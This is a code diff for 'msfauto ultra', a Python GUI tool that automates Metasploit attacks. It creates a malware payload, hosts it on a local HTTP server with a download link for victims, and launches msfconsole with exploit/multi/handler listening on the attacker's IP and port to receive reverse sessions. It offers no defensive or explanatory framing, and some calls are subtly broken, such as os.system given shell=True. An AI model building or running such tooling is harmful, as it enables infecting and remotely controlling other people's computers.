@@ -21,14 +21,7 @@ class msfauto_ultra():
         os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}", shell=True)
         print(Fore.RED + "You closed http server.")
     def return_links(self):  
-        pass
-        # print(Fore.WHITE + "\n\nThis is the malware download link: ")
-        # print(f"https:")
-        # print(Fore.WHITE + "This is the directory address:")
-        # print(f"http://{self.ip}:{self.port2}/")
-        # # print ngrok command
-        # print(Fore.WHITE + "For ngrok you can use this command:")
-        # print(f"ngrok http {self.port2}")
+        return f"Download app link:\nhttps://{self.ip}:{self.port2}/{self.app_name}\nDocument address:\nhttps://{self.ip}:{self.port2}"
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
         os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"', shell=True)
@@ -137,11 +130,12 @@ def read_info():
     msfultra = msfauto_ultra(app_name=reader[0], ip=reader[1], port_one=reader[2], port_two=reader[3], payload=reader[4])
     return msfultra
 def mainapp():
+    msfultra = read_info()
+    msfultra.create_malware()
+    msg.showinfo("Malware created", "Malware is creted complete")
+    time.sleep(5)
     root = Tk()
-    # def console_dot_py(): os.system("python3 console.py")
-    # def server_dot_py(): os.system("python3 server.py")
-    # Button(root, text="Start msfconsole", width=50, height=5,  command=console_dot_py).pack()
-    # Button(root, text="Start server", width=50, height=5, command=server_dot_py).pack()
+    Label(root, text=msfultra.return_links()).pack()
     with open("config", "r") as read:
         reader = read.readlines()
         reader = "".join(reader)
@@ -151,12 +145,11 @@ def mainapp():
     port_one = reader[2]
     port_two = reader[3] 
     payload = reader[4]
-    Label(root, text=f"""Starting all commands!
- Your IP is: {ip}
-Your first port is: {port_one}
-      Your second port is: {port_two}""").pack()
-    msfultra = read_info()
+#     Label(root, text=f"""Start commands.\n\n
+#  Your IP is: {ip}
+# Your first port is: {port_one}
+#       Your second port is: {port_two}""").pack()
     msfultra.start_together()
-    root.resizable(False, False)
+    root.resizable(True, True)
     root.title("msfauto ultra")
     root.mainloop()
